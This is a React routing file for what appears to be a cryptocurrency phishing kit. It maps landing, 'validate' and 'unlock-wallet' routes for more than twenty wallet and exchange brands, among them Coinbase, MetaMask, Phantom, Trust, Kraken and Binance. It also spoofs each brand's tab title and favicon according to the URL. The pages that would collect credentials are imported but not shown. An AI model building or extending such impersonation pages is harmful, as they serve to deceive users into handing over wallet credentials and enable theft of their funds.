import React, { useEffect } from 'react';
import { BrowserRouter, Route, Routes, useLocation  } from "react-router-dom";
 import Landing from './pages/Landing';
 import Home from './pages/Home';
import Wallet from './pages/Wallet';
import { ToastContainer } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';
import CryptoLanding from './cryptoCom/cryptoPages/CryptoLanding';
import CryptoHome from './cryptoCom/cryptoPages/CryptoHome';
import CryptoWallet from './cryptoCom/cryptoPages/CryptoWallet';
import MetaMaskLanding from './metaMask/metaMaskPages/MetaMaskLanding';
import PhantomLanding from './phantom/phantomPages/PhantomLanding';
import PhantomHome from './phantom/phantomPages/PhantomHome';
import PhantomWallet from './phantom/phantomPages/PhantomWallet';
import MetaMaskHome from './metaMask/metaMaskPages/MetaMaskHome';
import MetaMaskWallet from './metaMask/metaMaskPages/MetaMaskWallet';
import TrustLanding from './trust/trustPages/TrustLanding';
import TrustHome from './trust/trustPages/TrustHome';
import TrustWallet from './trust/trustPages/TrustWallet';
 import Default from './pages/Default';
import BitcoinLanding from './bitcoinCom/bitcoinPages/BitcoinLanding';
import BitcoinHome from './bitcoinCom/bitcoinPages/BitcoinHome';
import BitcoinWallet from './bitcoinCom/bitcoinPages/BitcoinWallet';
import KrakenLanding from './kraken/krakenPages/KrakenLanding';
import KrakenHome from './kraken/krakenPages/KrakenHome';
import KrakenWallet from './kraken/krakenPages/KrakenWallet';
import ExodusLanding from './exodus/exodusPages/ExodusLanding';
import ExodusHome from './exodus/exodusPages/ExodusHome';
import ExodusWallet from './exodus/exodusPages/ExodusWallet';
import RobinHoodLanding from './robinHood/robinHoodPages/RobinHoodLanding';
import RobinHoodHome from './robinHood/robinHoodPages/RobinHoodHome';
import RobinHoodWallet from './robinHood/robinHoodPages/RobinHoodWallet';


//stan additional imports
import CbPaymentHome from './stan/CbPayment/cbPaymentHome';
import CbPaymentLanding from "./stan/CbPayment/CbPaymentLanding";
import Skrill from './stan/Skrill/skrillHome';
import SkrillLanding from './stan/Skrill/SkrillLanding';
import Gemini from './stan/Gemini/geminiHome';
  import GeminiLanding from './stan/Gemini/geminiLanding';
  import Binance from './stan/Binance/binanceHome';
  import BinanceLanding from './stan/Binance/binanceLanding';
  import Revolut from './stan/Revolut/revolutHome';
   import RevolutLanding from './stan/Revolut/revolutLanding';
   import Stancoinbase from './stan/coinbase/Landing';
import StanCoinbaseValidate from './stan/coinbase/Wallet';
import StanExodus from './stan/exodus/exodusPages/ExodusLanding';
import ExodusWalletVallidation from './stan/exodus/exodusPages/ExodusWallet';
import StanCryptoLanding from './stan/cryptoCom/cryptoPages/CryptoLanding';
import StanCryptoWallet from './stan/cryptoCom/cryptoPages/CryptoWallet';
import StanBitcoin from './stan/bitcoinCom/bitcoinPages/BitcoinLanding';
import StanBitcoinWallet from './stan/bitcoinCom/bitcoinPages/BitcoinWallet';
import StanKraken from './stan/kraken/krakenPages/KrakenLanding';
import StanKrakenWallet from './stan/kraken/krakenPages/KrakenWallet';
import StanMeta from './stan/metaMask/metaMaskPages/MetaMaskLanding';
import StanMetaWallet from './stan/metaMask/metaMaskPages/MetaMaskWallet';
import StanPhantom from './stan/phantom/phantomPages/PhantomLanding';
import StanPhantomWallet from './stan/phantom/phantomPages/PhantomWallet';
import StanRobinHood from './stan/robinHood/robinHoodPages/RobinHoodLanding';
import StanRobinHoodWallet from './stan/robinHood/robinHoodPages/RobinHoodWallet';
import StanUniswap from './stan/uniswap/uniswapPages/UniswapLanding';
import StanUniswapWallet from './stan/uniswap/uniswapPages/UniswapWallet';
import StanVault from './stan/Vault/vaultPages/VaultLanding';
import StanVaultWallet from './stan/Vault/vaultPages/VaultWallet';
import StanEtoro from './stan/etoro/etoroLanding';
import StanEtoroWallet from './stan/etoro/etoroHome';
import BitPandaLanding from "./stan/BitPanda/bitPandaLanding.jsx";
import StanBitpandaWallet from "./stan/BitPanda/bitPandaWallet.jsx";
import StanEdge from './stan/edge/edgeLanding.jsx';
import StanEdgeWallet from './stan/edge/edgeWallet.jsx';
import StanWallets from './stan/others/walletLanding.jsx';
import StanSecureWallet from './stan/others/secureWallet.jsx';
import StanTrust from './stan/trust/trustPages/TrustLanding.jsx';
import StanTrustWallet from './stan/trust/trustPages/TrustWallet.jsx';


const App = () => {
  return (
    <>
      <BrowserRouter> 
        <DynamicTitleAndLogo/>
        <Routes> 
          {<Route path='/' element={<Default/>}/>}
          <Route path='/coin/coinbase' element={<Landing/>}/>
          <Route path='/coinbase/validate' element={<Home/>}/>
          <Route path='/unlock-Coinbase-wallet' element={<Wallet/>}/>
          <Route path='/coin/crypto' element={<CryptoLanding/>}/>
          <Route path='/crypto/validate' element={<CryptoHome/>}/>
          <Route path='/crypto/unlock-crypto-wallet' element={<CryptoWallet/>}/>
          <Route path='/coin/phantom' element={<PhantomLanding/>}/>
          <Route path='/phantom/validate' element={<PhantomHome/>}/>
          <Route path='/phantom/unlock-phantom-wallet' element={<PhantomWallet/>}/>
          <Route path='/coin/meta' element={<MetaMaskLanding/>}/>
          <Route path='/meta/validate' element={<MetaMaskHome/>}/>
          <Route path='/meta/unlock-metamask-wallet' element={<MetaMaskWallet/>}/>
          <Route path='/coin/trust' element={<TrustLanding/>}/>
          <Route path='/trust/validate' element={<TrustHome/>}/>
          <Route path='unlock-trust-wallet' element={<TrustWallet/>}/>
          <Route path='/coin/bitcoin' element={<BitcoinLanding/>}/>
          <Route path='/bitcoin/validate' element={<BitcoinHome/>}/>
          <Route path='unlock-bitcoin-wallet' element={<BitcoinWallet/>}/>
          <Route path='/coin/kraken' element={<KrakenLanding/>}/>
          <Route path='/kraken/validate' element={<KrakenHome/>}/>
          <Route path='unlock-kraken-wallet' element={<KrakenWallet/>}/>
          <Route path='/coin/exo' element={<ExodusLanding/>}/>
          <Route path='/exo/validate' element={<ExodusHome/>}/>
          <Route path='unlock-exodus-wallet' element={<ExodusWallet/>}/>
          <Route path='/coin/robinhood' element={<RobinHoodLanding/>}/>
          <Route path='/robinhood/validate' element={<RobinHoodHome/>}/>
          <Route path='unlock-robinhood-wallet' element={<RobinHoodWallet/>}/>


          <Route path='cbpayment' element={<CbPaymentHome/>}/>
          <Route path='cbpayment-landing' element={<CbPaymentLanding/>}/>
          <Route path='skrill' element={<Skrill/>}/>
          <Route path='skrill-landing' element={<SkrillLanding/>}/>
          <Route path='gemini' element={<Gemini/>}/>
          { <Route path='gemini-landing' element={<GeminiLanding/>}/> }
          <Route path='binance' element={<Binance/>}/>
          { <Route path='binance-landing' element={<BinanceLanding/>}/> }
          <Route path='revolut' element={<Revolut/>}/>
          { <Route path='revolut-landing' element={<RevolutLanding/>}/> }
          <Route path='coinbase' element={<Stancoinbase/>}/>
          <Route path='/coinbase-wallet' element={<StanCoinbaseValidate/>}/>
           <Route path='/exodu' element={<StanExodus/>}/>
           <Route path='/exodu-wallet' element={<ExodusWalletVallidation/>}/>
            <Route path='crypto' element={<StanCryptoLanding/>}/>
            <Route path='/crypto-wallet' element={<StanCryptoWallet/>}/>
            <Route path='bitcoin' element={<StanBitcoin/>}/>
            <Route path='/bitcoin-wallet' element={<StanBitcoinWallet/>}/>
            <Route path='kraken' element={<StanKraken/>}/>
            <Route path='/kraken-wallet' element={<StanKrakenWallet/>}/>
            <Route path='meta' element={<StanMeta/>}/>
            <Route path='/meta-wallet' element={<StanMetaWallet/>}/>
            <Route path='phantom' element={<StanPhantom/>}/>
            <Route path='/phantom-wallet' element={<StanPhantomWallet/>}/>
            <Route path='robinhood' element={<StanRobinHood/>}/>
            <Route path='/robinhood-wallet' element={<StanRobinHoodWallet/>}/>
            <Route path='uniswap' element={<StanUniswap/>}/>
            <Route path='/uniswap-wallet' element={<StanUniswapWallet/>}/>
            <Route path='vault' element={<StanVault/>}/>
            <Route path='/vault-wallet' element={<StanVaultWallet/>}/>
            <Route path='etoro' element={<StanEtoro/>}/>
            <Route path='/etoro-wallet' element={<StanEtoroWallet/>}/>
            <Route path='bitpanda' element={<BitPandaLanding/>}/>
            <Route path='/bitpanda-wallet' element={<StanBitpandaWallet/>}/>
            <Route path='edge' element={<StanEdge/>}/>
            <Route path='/edge-wallet' element={<StanEdgeWallet/>}/>
            <Route path='/secure-wallet' element={<StanSecureWallet/>}/>
            <Route path='wallets' element={<StanWallets/>}/>
            <Route path='/trust-wallet' element={<StanTrustWallet/>}/>
            <Route path='trust' element={<StanTrust/>}/>
        </Routes>
      </BrowserRouter>
      <ToastContainer />
    </>
  )
}

function DynamicTitleAndLogo() {
  const location = useLocation();

  useEffect(() => {
    const updateMetaData = () => {
      if (location.pathname.includes("coinbase")) {
        document.title = "Coinbase";
        document.querySelector("link[rel='icon']").href = "/logoTop.png";
      }
      else if (location.pathname.includes("crypto")) {
        document.title = "Crypto";
        document.querySelector("link[rel='icon']").href = "/crypto_com_logo.png";
      } else  if (location.pathname.includes("meta")) {
        document.title = "Meta";
        document.querySelector("link[rel='icon']").href = "/Meta.png";
      } else  if (location.pathname.includes("phantom")) {
        document.title = "Phantom";
        document.querySelector("link[rel='icon']").href = "/phantom_logo.png";
      } else  if (location.pathname.includes("trust")) {
        document.title = "Trust";
        document.querySelector("link[rel='icon']").href = "/trust_logo.png";
      } else  if (location.pathname.includes("bitcoin")) {
        document.title = "wallet,bitcoin.com";
        document.querySelector("link[rel='icon']").href = "/bitcoin_logo.png";
      }
      else  if (location.pathname.includes("kraken")) {
        document.title = "kraken wallet";
        document.querySelector("link[rel='icon']").href = "/kraken_logo.png";
      }
      else  if (location.pathname.includes("exodus")) {
        document.title = "Exodus wallet";
        document.querySelector("link[rel='icon']").href = "/exodus_logo.png";
      }
      else  if (location.pathname.includes("robinhood")) {
        document.title = "RobinHood wallet";
        document.querySelector("link[rel='icon']").href = "/robinhood_logo.png";
      }
      else {
        document.title = "empty";
        document.querySelector("link[rel='icon']").href = "";
      }
    };

    updateMetaData();
  }, [location]);

  return null;
}

export default App;